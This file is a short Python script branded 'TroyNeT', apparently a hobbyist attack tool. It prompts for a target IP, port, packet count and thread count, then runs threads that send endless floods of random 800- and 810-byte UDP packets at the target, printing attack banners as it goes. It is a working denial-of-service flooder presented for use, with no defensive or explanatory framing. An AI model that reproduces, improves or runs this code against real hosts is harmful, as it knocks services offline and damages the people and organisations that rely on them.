#XSamp
import random
import threading
import socket
import os,sys

os.system("clear")
print("""</Troy NeT>""")
print("—————————————————————————————————————————————————————")
print("TOOLS BY TroyNeT")
print("")
print("enable")
print("—————————————————————————————————————————————————————")

ip = str(input("IP HOST :"))
port = int(input("PORT HOST :"))
choice = str(input("GASS ATTACK Y/N :"))
times = int(input("PACKETS :"))
threads = int(input("THREADS :"))

def troy():
    data = random._urandom(800)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
                print("\033[91m[umbrella2]ATTACK ΣΣZZY TroyNeT")
        except:
            print("\033[94m[umbrella2]TEMBUSKAN!!")

def troy2():
    data = random._urandom(810)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
                print("[umbrella2]net PRESENT")
        except:
            s.close()
            print("\033[94m[umbrella2]TEMBUS?!!")

for y in range(threads):
    if choice == 'Y':
        th = threading.Thread(target = troy)
        th.start()
        th = threading.Thread(target = troy2)
        th.start()
